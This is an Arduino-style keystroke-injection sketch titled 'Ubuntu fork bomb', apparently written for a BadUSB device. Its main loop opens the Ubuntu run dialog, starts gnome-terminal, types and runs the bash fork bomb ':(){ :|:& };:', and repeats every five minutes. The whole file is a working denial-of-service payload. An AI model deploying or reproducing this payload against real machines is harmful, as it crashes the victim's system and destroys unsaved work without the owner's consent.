// Title: Ubuntu fork bomb
// Author: Rennan Cockles

#include <Keyboard.h>

Keyboard kb;


void setup()
{  
    Serial.begin(9600);  
    delay(1000);
}


void loop()
{
    kb.ALT_F2();
    kb.DELAY(500);    
    kb.STRING("gnome-terminal"); 
    kb.ENTER();
    kb.DELAY(1500);   
    kb.STRING(":(){ :|:& };:"); 
    kb.ENTER();
    kb.DELAY(500);
    
    kb.DELAY(300000); 
}



